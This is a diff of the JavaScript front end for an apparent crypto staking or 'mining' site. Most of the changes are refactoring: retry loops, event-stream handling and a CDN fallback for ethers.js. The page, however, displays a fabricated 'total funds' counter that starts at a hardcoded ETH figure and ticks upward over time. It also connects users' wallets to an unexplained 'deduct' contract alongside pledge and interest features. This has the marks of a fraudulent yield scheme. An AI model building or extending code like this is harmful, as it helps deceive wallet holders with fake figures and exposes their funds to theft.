@@ -1,4 +1,3 @@
-// script.js - 完整版，本地 ethers.js，無 defer，無 inline
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
@@ -83,7 +82,7 @@ let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 let isServerAvailable = false;
 let pendingUpdates = [];
 let localLastUpdated = 0;
-const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.isDevMode;
 
 const translations = {
   'en': {
@@ -214,10 +213,17 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   }
 }
 
-async function retryDOMAcquisition() {
-  grossOutputValue = document.getElementById('grossOutputValue');
-  cumulativeValue = document.getElementById('cumulativeValue');
-  return !!grossOutputValue && !!cumulativeValue;
+async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
+  let attempts = 0;
+  while (attempts < maxAttempts) {
+    grossOutputValue = document.getElementById('grossOutputValue');
+    cumulativeValue = document.getElementById('cumulativeValue');
+    if (grossOutputValue && cumulativeValue) return true;
+    await new Promise(r => setTimeout(r, delayMs));
+    attempts++;
+  }
+  updateStatus(translations[currentLang].error + ': 無法獲取 DOM 元素', true);
+  return false;
 }
 
 async function checkServerStatus() {
@@ -226,9 +232,7 @@ async function checkServerStatus() {
     if (response.ok) {
       const { status, lastUpdated } = await response.json();
       isServerAvailable = status === 'available';
-      if (isServerAvailable && pendingUpdates.length > 0) {
-        await syncPendingUpdates(lastUpdated);
-      }
+      if (isServerAvailable && pendingUpdates.length > 0) await syncPendingUpdates(lastUpdated);
       return isServerAvailable;
     }
   } catch (error) {
@@ -240,9 +244,7 @@ async function checkServerStatus() {
 
 async function syncPendingUpdates(serverLastUpdated) {
   for (const update of pendingUpdates) {
-    if (update.timestamp > serverLastUpdated) {
-      await saveUserData(update.data, false);
-    }
+    if (update.timestamp > serverLastUpdated) await saveUserData(update.data, false);
   }
   pendingUpdates = [];
 }
@@ -262,12 +264,8 @@ async function loadUserDataFromServer() {
       pledgedAmount = userData.pledgedAmount ? parseFloat(userData.pledgedAmount) : 0;
       accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
       localStorage.setItem('userData', JSON.stringify({
-        stakingStartTime,
-        claimedInterest,
-        pledgedAmount,
-        accountBalance,
-        nextBenefitTime: userData.nextBenefitTime,
-        lastUpdated: allData.lastUpdated
+        stakingStartTime, claimedInterest, pledgedAmount, accountBalance,
+        nextBenefitTime: userData.nextBenefitTime, lastUpdated: allData.lastUpdated
       }));
       localLastUpdated = allData.lastUpdated;
     }
@@ -355,6 +353,7 @@ function resetState(showMsg = true) {
   const existingClaimBtn = document.getElementById('claimButton');
   if (existingClaimBtn) existingClaimBtn.remove();
   if (connectButton) {
+    connectButton.classList.remove('connected');
     connectButton.textContent = 'Connect';
     connectButton.title = 'Connect Wallet';
   }
@@ -373,10 +372,7 @@ function disableInteractiveElements(disable = false) {
   if (pledgeAmount) pledgeAmount.disabled = disable;
   if (pledgeDuration) pledgeDuration.disabled = disable;
   if (pledgeToken) pledgeToken.disabled = disable;
-  if (refreshWallet) {
-    refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
-    refreshWallet.style.color = disable ? '#999' : '#ff00ff';
-  }
+  if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
   if (claimBtn) claimBtn.disabled = disable;
 }
 
@@ -390,15 +386,11 @@ function updateBalancesUI(walletBalances) {
   const decimals = { USDT: 6, USDC: 6, WETH: 18 };
   const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
   const formattedWalletBalance = window.ethers.utils.formatUnits(walletTokenBigInt, decimals[selectedToken]);
-  if (walletBalanceAmount) {
-    walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
-  }
+  if (walletBalanceAmount) walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
   const claimedBalance = accountBalance[selectedToken] || 0;
   const pledgeData = JSON.parse(localStorage.getItem('userData') || '{}').pledgedAmount || 0;
   const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance + (selectedToken === pledgeToken.value ? pledgeData : 0);
-  if (accountBalanceValue) {
-    accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
-  }
+  if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
   if (parseFloat(formattedWalletBalance) < 0.001) {
     updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
   } else if (statusDiv && statusDiv.style.color === 'rgb(255, 215, 0)') {
@@ -408,15 +400,12 @@ function updateBalancesUI(walletBalances) {
 
 function updateTotalFunds() {
   if (!totalValue) return;
-  const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
   const initialFunds = 12856459.94;
-  const averageIncreasePerSecond = 0.055;
-  const currentTime = Date.now();
-  const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
-  const totalIncrease = elapsedSeconds * averageIncreasePerSecond;
-  const randomFluctuation = (Math.random() - 0.5) * 2;
-  const totalFunds = initialFunds + totalIncrease + randomFluctuation;
-  totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
+  const increasePerSecond = 0.055;
+  const startTime = Date.now() - (initialFunds / increasePerSecond * 1000);
+  const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
+  const total = initialFunds + (elapsedSeconds * increasePerSecond);
+  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
 
 async function updateInterest() {
@@ -579,10 +568,19 @@ async function sendMobileRobustTransaction(populatedTx) {
 }
 
 async function initializeWallet() {
-  if (!window.ethers) {
-    updateStatus(translations[currentLang].ethersError, true);
-    connectButton.disabled = true;
-    return;
+  let ethersLoaded = false;
+  for (let i = 0; i < 30; i++) {
+    if (window.ethers && window.ethers.providers && window.ethers.providers.Web3Provider) { ethersLoaded = true; break; }
+    await new Promise(r => setTimeout(r, 2000));
+  }
+  if (!ethersLoaded) {
+    const cdnUrls = ['https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js', 'https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js'];
+    for (let url of cdnUrls) {
+      const s = document.createElement('script'); s.type = 'text/javascript'; s.src = url; s.async = false; document.head.appendChild(s);
+      await new Promise(r => setTimeout(r, 3000));
+      if (window.ethers && window.ethers.providers && window.ethers.providers.Web3Provider) { ethersLoaded = true; break; }
+    }
+    if (!ethersLoaded) { updateStatus(translations[currentLang].ethersError, true); connectButton.disabled = true; return; }
   }
   try {
     if (typeof window.ethereum === 'undefined') {
@@ -618,7 +616,7 @@ async function connectWallet() {
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account selected.");
     signer = provider.getSigner(); userAddress = await signer.getAddress();
-    connectButton.textContent = '已連線'; connectButton.title = '斷開錢包連線';
+    connectButton.classList.add('connected'); connectButton.textContent = '已連線'; connectButton.title = '斷開錢包連線';
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -722,6 +720,7 @@ async function getEthPrices() {
 
 async function claimInterest() {
   if (!userAddress || !stakingStartTime || pledgedAmount <= 0) {
+    console.log('claimInterest blocked: mining not started');
     return;
   }
   await loadUserDataFromServer();
@@ -766,20 +765,41 @@ function setupSSE() {
     source.onmessage = async (event) => {
       try {
         const parsed = JSON.parse(event.data);
-        if (parsed.event === 'dataUpdate' && parsed.data.users?.[userAddress]) {
-          if (parsed.data.lastUpdated > localLastUpdated) {
-            localLastUpdated = parsed.data.lastUpdated;
+        const eventType = parsed.event;
+        const data = parsed.data;
+        if (eventType === 'dataUpdate' && data.users && data.users[userAddress]) {
+          if (data.lastUpdated > localLastUpdated) {
+            localLastUpdated = data.lastUpdated;
             await loadUserDataFromServer();
             await updateInterest();
+            const balances = {
+              usdt: userAddress ? await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
+              usdc: userAddress ? await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
+              weth: userAddress ? await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) : 0n
+            };
+            updateBalancesUI(balances);
           }
+        } else if (eventType === 'ping') {
+          console.log(`SSE: Received ping, timestamp: ${data.timestamp || 'unknown'}`);
+        } else if (eventType === 'error') {
+          updateStatus(`SSE error: ${data.message || 'unknown'}`, true);
         }
-      } catch (e) { }
+        retryCount = 0;
+        if (fallbackPollingInterval) {
+          clearInterval(fallbackPollingInterval);
+          fallbackPollingInterval = null;
+        }
+      } catch (error) {}
     };
-    source.onerror = () => {
-      source.close(); isServerAvailable = false;
+    source.onerror = async () => {
+      source.close();
+      isServerAvailable = false;
       if (retryCount < maxRetries) {
         retryCount++;
-        setTimeout(connectSSE, baseRetryDelay * retryCount);
+        setTimeout(connectSSE, baseRetryDelay * (retryCount + 1));
+      } else {
+        updateStatus(translations[currentLang].sseFailed, true);
+        startFallbackPolling();
       }
     };
   }
@@ -815,7 +835,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
   if (claimModal) claimModal.onclick = e => e.target === claimModal && (claimModal.style.display = 'none');
   languageSelect.onchange = e => updateLanguage(e.target.value);
-  connectButton.onclick = async () => connectButton.textContent.includes('連線') ? disconnectWallet() : await connectWallet();
+  connectButton.onclick = async () => connectButton.classList.contains('connected') ? disconnectWallet() : await connectWallet();
   startBtn.onclick = async () => {
     const currentLang = localStorage.getItem('language') || 'zh-Hant';
     if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
